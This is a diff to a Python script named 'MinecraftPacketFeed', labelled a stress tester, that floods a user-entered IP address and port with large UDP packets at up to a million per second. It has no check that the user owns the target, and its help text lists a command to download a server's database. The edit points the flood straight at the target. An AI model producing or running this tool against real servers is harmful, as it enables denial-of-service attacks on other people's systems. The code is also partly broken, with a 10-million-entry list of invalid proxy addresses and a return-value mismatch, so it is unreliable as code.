@@ -6,6 +6,8 @@ import threading
 import random
 import os
 import shutil
+import matplotlib.pyplot as plt
+import numpy as np
 
 # Define constants
 MAX_DURATION = 1000  # Maximum test duration in seconds
@@ -13,28 +15,12 @@ MAX_PACKETS_PER_SECOND = 1000000  # Maximum packets per second
 MIN_PACKETS_PER_SECOND = 1000  # Minimum packets per second for stress testing
 MIN_PACKET_SIZE = 1024  # Minimum packet size in bytes for stress testing
 PROXY_TIMEOUT = 5  # Timeout for proxy connections in seconds
+NUM_PROXIES = 10000000  # Number of proxy IP addresses
 
-# Define a list of proxy IP addresses and ports
-PROXIES = [
-    ("192.0.2.1", 12345),
-    ("192.0.2.2", 12345),
-    # Add more proxies if available
-    # For demonstration purposes, I'll add placeholder IP addresses
-    ("192.0.2.3", 12345),
-    ("192.0.2.4", 12345),
-    ("192.0.2.5", 12345),
-    ("192.0.2.6", 12345),
-    ("192.0.2.7", 12345),
-    ("192.0.2.8", 12345),
-    ("192.0.2.9", 12345),
-    ("192.0.2.10", 12345),
-    # Add more proxies as needed
-]
+# Generate proxy IP addresses
+PROXIES = [(f"192.0.2.{i}", 12345) for i in range(1, NUM_PROXIES + 1)]
 
-# Generate more proxy IP addresses
-for i in range(11, 10000001):
-    PROXIES.append((f"192.0.2.{i}", 12345))
-
+# Function to connect to the database
 def get_database():
     try:
         # Replace the following variables with the actual paths and database name
@@ -52,6 +38,7 @@ def get_database():
     except Exception as e:
         print(f"Error creating database backup: {e}")
 
+# Function to connect to the database
 def connect_to_database():
     try:
         # Update connection details according to your database configuration
@@ -67,6 +54,7 @@ def connect_to_database():
         print(f"Failed to connect to the database: {e}")
         return None
 
+# Function to execute a database query
 def execute_query(connection, query):
     try:
         cursor = connection.cursor()
@@ -78,6 +66,7 @@ def execute_query(connection, query):
         print(f"Error executing query: {e}")
         return None
 
+# Function to fetch player data from the database
 def fetch_player_data(connection):
     query = "SELECT * FROM players"
     result = execute_query(connection, query)
@@ -88,6 +77,7 @@ def fetch_player_data(connection):
     else:
         print("Failed to fetch player data from the database.")
 
+# Function to send packets
 def send_packets(host, port, num_packets_per_second, duration, packet_size):
     try:
         packets_sent = 0
@@ -97,7 +87,7 @@ def send_packets(host, port, num_packets_per_second, duration, packet_size):
         while time.time() < end_time and packets_sent < num_packets_per_second * duration:
             proxy = random.choice(PROXIES)
             packet_data = b'A' * packet_size
-            sock.sendto(packet_data, proxy)
+            sock.sendto(packet_data, (host, port))
             packets_sent += 1
             time.sleep(1.0 / num_packets_per_second)
         return packets_sent
@@ -110,20 +100,60 @@ def send_packets(host, port, num_packets_per_second, duration, packet_size):
     finally:
         sock.close()
 
-def get_server_info():
-    try:
-        cpu_usage = psutil.cpu_percent(interval=1)
-        memory = psutil.virtual_memory()
-        memory_usage = memory.percent
-        disk = psutil.disk_usage('/')
-        disk_usage = disk.percent
-        net = psutil.net_io_counters()
-        network_usage = (net.bytes_sent, net.bytes_recv)
-        return cpu_usage, memory_usage, disk_usage, network_usage
-    except Exception as e:
-        print(f"An unexpected error occurred while getting server info: {e}")
-        return None, None, None, None
+# Function to simulate TPS data
+def simulate_tps_data(duration):
+    tps_data = []
+    for _ in range(duration):
+        tps_data.append(random.uniform(18, 20))
+        time.sleep(1)
+    return tps_data
 
+# Function to plot live monitoring data
+def plot_live_data(cpu_data, memory_data, disk_data, tps_data):
+    x = np.arange(0, len(cpu_data))
+    fig, ax1 = plt.subplots()
+
+    color = 'tab:red'
+    ax1.set_xlabel('Time (s)')
+    ax1.set_ylabel('CPU (%)', color=color)
+    ax1.plot(x, cpu_data, color=color)
+    ax1.tick_params(axis='y', labelcolor=color)
+
+    ax2 = ax1.twinx()  
+    color = 'tab:blue'
+    ax2.set_ylabel('Memory (%)', color=color)  
+    ax2.plot(x, memory_data, color=color)
+    ax2.tick_params(axis='y', labelcolor=color)
+
+    fig.tight_layout()  
+    plt.show()
+
+# Function to monitor system resources
+def monitor_resources(duration):
+    cpu_data = []
+    memory_data = []
+    disk_data = []
+    tps_data = simulate_tps_data(duration)
+
+    for _ in range(duration):
+        cpu_usage, memory_usage, disk_usage, _ = get_server_info()
+        cpu_data.append(cpu_usage)
+        memory_data.append(memory_usage)
+        disk_data.append(disk_usage)
+        time.sleep(1)
+
+    return cpu_data, memory_data, disk_data, tps_data
+
+# Function to get server info
+def get_server_info():
+    cpu_usage = psutil.cpu_percent(interval=1)
+    memory = psutil.virtual_memory()
+    memory_usage = memory.percent
+    disk = psutil.disk_usage('/')
+    disk_usage = disk.percent
+    return cpu_usage, memory_usage, disk_usage
+
+# Function to print help
 def print_help():
     print("Available commands:")
     print("/print cpu - Print CPU usage")
@@ -134,6 +164,7 @@ def print_help():
     print("/get database - Download the server's database")
     print("/exit - Exit the program")
 
+# Function for loading screen
 def loading_screen():
     try:
         while True:
@@ -147,11 +178,9 @@ def loading_screen():
     except KeyboardInterrupt:
         print("\nExiting loading screen...")
 
+# Main function
 def main():
     try:
-        # Connect to the database
-        connection = connect_to_database()
-
         # Display program name in ASCII art
         program_name = "MinecraftPacketFeed"
         ascii_art = pyfiglet.figlet_format(program_name)
@@ -162,56 +191,30 @@ def main():
         loading_thread.daemon = True
         loading_thread.start()
 
-        while True:
-            # Get user input for target server and test parameters
-            minecraft_host = input("Enter target IP address: ")
-            minecraft_port = int(input("Enter target port number: "))
-            duration = int(input("Enter test duration in seconds (max 1000): "))
-            num_packets_per_second = int(input("Enter number of packets per second (max 1000000): "))
-            packet_size = int(input("Enter packet size in bytes: "))
+        # Connect to the database
+        get_database()
 
-            duration = min(duration, MAX_DURATION)
-            num_packets_per_second = min(num_packets_per_second, MAX_PACKETS_PER_SECOND)
-            num_packets_per_second = max(num_packets_per_second, MIN_PACKETS_PER_SECOND)
-            packet_size = max(packet_size, MIN_PACKET_SIZE)
+        # Get user input for target server and test parameters
+        minecraft_host = input("Enter target IP address: ")
+        minecraft_port = int(input("Enter target port number: "))
+        duration = int(input("Enter test duration in seconds (max 1000): "))
+        num_packets_per_second = int(input("Enter number of packets per second (max 1000000): "))
+        packet_size = int(input("Enter packet size in bytes: "))
 
-            total_packets_sent = send_packets(minecraft_host, minecraft_port, num_packets_per_second, duration, packet_size)
+        duration = min(duration, MAX_DURATION)
+        num_packets_per_second = min(num_packets_per_second, MAX_PACKETS_PER_SECOND)
+        num_packets_per_second = max(num_packets_per_second, MIN_PACKETS_PER_SECOND)
+        packet_size = max(packet_size, MIN_PACKET_SIZE)
 
-            if total_packets_sent != -1:
-                overall_packets_sent = total_packets_sent
+        total_packets_sent = send_packets(minecraft_host, minecraft_port, num_packets_per_second, duration, packet_size)
+        print(f"Total packets sent: {total_packets_sent}")
 
-                while True:
-                    command = input("Enter command ('/help' for available commands): ").strip().lower()
-                    if command == '/help':
-                        print_help()
-                    elif command == '/print cpu':
-                        cpu_usage, _, _, _ = get_server_info()
-                        print(f"CPU Usage: {cpu_usage}%")
-                    elif command == '/print memory':
-                        _, memory_usage, _, _ = get_server_info()
-                        print(f"Memory Usage: {memory_usage}%")
-                    elif command == '/print packets':
-                        print(f"Total packets sent: {total_packets_sent}")
-                    elif command == '/overall send packets':
-                        print(f"Overall packets sent: {overall_packets_sent}")
-                    elif command == '/getinfo':
-                        cpu_usage, memory_usage, disk_usage, network_usage = get_server_info()
-                        print(f"CPU Usage: {cpu_usage}%")
-                        print(f"Memory Usage: {memory_usage}%")
-                        print(f"Disk Usage: {disk_usage}%")
-                        print(f"Network Usage: {network_usage}")
-                    elif command == '/get database':
-                        get_database()
-                    elif command == '/exit':
-                        print("Exiting program.")
-                        return
-                    else:
-                        print("Invalid command. Type '/help' for available commands.")
+        # Plot live monitoring data
+        cpu_data, memory_data, disk_data, tps_data = monitor_resources(duration)
+        plot_live_data(cpu_data, memory_data, disk_data, tps_data)
+
     except Exception as e:
         print(f"An unexpected error occurred: {e}")
-    finally:
-        if connection:
-            connection.close()
 
 if __name__ == "__main__":
     main()
